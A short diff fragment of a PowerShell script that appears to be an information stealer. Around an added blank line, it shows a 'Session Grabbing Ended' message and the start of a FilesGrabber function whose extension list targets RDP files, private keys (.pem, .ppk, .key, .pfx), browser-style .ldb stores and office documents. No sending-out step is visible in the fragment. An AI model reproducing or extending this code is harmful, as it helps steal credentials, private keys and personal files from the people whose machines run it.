@@ -955,6 +955,7 @@ function Backup-Data {
 	
     Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
+    
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
